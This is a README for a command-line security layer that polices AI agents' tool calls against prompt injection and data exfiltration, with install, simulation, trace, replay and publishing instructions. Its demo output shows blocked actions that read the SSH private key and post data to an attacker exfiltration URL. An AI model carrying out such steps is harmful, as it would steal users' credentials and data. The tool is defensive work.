# Ari Kernel CLI

Runtime security layer for AI agents — enforces policy on every tool call to block prompt injection, data exfiltration, and unsafe actions.

```bash
npm install -g @arikernel/cli
```

```bash
arikernel simulate prompt-injection
```

```
  ALLOWED  web_request(https://example.com)
  BLOCKED  read_file(~/.ssh/id_rsa)
           Behavioral rule triggered. Run quarantined.
  BLOCKED  http_post(https://attacker.com/exfil)
           Run in restricted mode. Egress denied.
```

[GitHub](https://github.com/AriKernel/arikernel) — if this is useful, consider giving it a star.

## Install

### Global (recommended)

```bash
npm install -g @arikernel/cli
```

Then run the full forensic demo:

```bash
arikernel simulate prompt-injection
arikernel trace --latest
arikernel replay --latest --step
```

### npx (no install)

```bash
npx @arikernel/cli --help
npx @arikernel/cli init
```

### Local dev

```bash
git clone https://github.com/AriKernel/arikernel.git
cd AriKernel
pnpm install
pnpm build
pnpm ari --help
```

## Commands

| Command | Description |
|---------|-------------|
| `arikernel simulate [type]` | Run attack simulations (prompt-injection, data-exfiltration, tool-escalation) |
| `arikernel trace [runId]` | Display security execution trace from audit log |
| `arikernel replay [runId]` | Replay a recorded session step by step |
| `arikernel replay-trace <file>` | Replay a JSON trace file through a fresh kernel |
| `arikernel sidecar` | Start sidecar proxy (default port 8787) |
| `arikernel run` | Start the firewall in run mode |
| `arikernel policy <file>` | Validate a policy YAML file |
| `arikernel init` | Generate a starter `arikernel.policy.yaml` |

All forensic commands default to `./arikernel-audit.db`. Override with `--db <path>`.

### Sidecar options

```bash
arikernel sidecar --policy ./arikernel.policy.yaml --port 8787 --audit-log ./sidecar-audit.db
```

### Replay-trace options

```bash
arikernel replay-trace ./trace.json --verbose
arikernel replay-trace ./trace.json --preset workspace-assistant  # what-if analysis
arikernel replay-trace ./trace.json --json                        # machine-readable output
```

> **Tip:** If `--latest` picks a stale run, delete `arikernel-audit.db` and re-simulate.

## Requirements

- Node.js >= 20

## npm package

The package is published as `@arikernel/cli`. The `bin` field ensures the command is `arikernel`:

```bash
npm install -g @arikernel/cli
arikernel --help
```

## Publish checklist

### Pre-publish verification

```bash
npm whoami
npm access ls-packages
```

### Build and test

```bash
pnpm build
pnpm test
```

### Publish the CLI

The CLI bundles all `@arikernel/*` packages at build time, so only the CLI itself needs publishing.
The library packages (`@arikernel/core`, `@arikernel/runtime`, etc.) are published separately for developers who use the runtime API directly.

```bash
# Library packages (for developers using the runtime API)
pnpm --filter @arikernel/core publish --no-git-checks
pnpm --filter @arikernel/taint-tracker publish --no-git-checks
pnpm --filter @arikernel/policy-engine publish --no-git-checks
pnpm --filter @arikernel/tool-executors publish --no-git-checks
pnpm --filter @arikernel/audit-log publish --no-git-checks
pnpm --filter @arikernel/runtime publish --no-git-checks
pnpm --filter @arikernel/attack-sim publish --no-git-checks
pnpm --filter @arikernel/adapters publish --no-git-checks

# CLI (self-contained, bundles all @arikernel/* deps)
pnpm --filter @arikernel/cli publish --no-git-checks
```

> **Note:** `@arikernel/sidecar`, `@arikernel/control-plane`, `@arikernel/mcp-adapter`, and `@arikernel/benchmarks` are repo-only packages (private). They are bundled into the CLI and not published separately.

> `--no-git-checks` is needed because pnpm replaces `workspace:*` with real versions at publish time regardless of git state.

### Post-publish verification

```bash
npm view @arikernel/cli version license description
npm install -g @arikernel/cli
arikernel --help
```

## License

See [LICENSE.md](../../LICENSE.md) for usage terms.
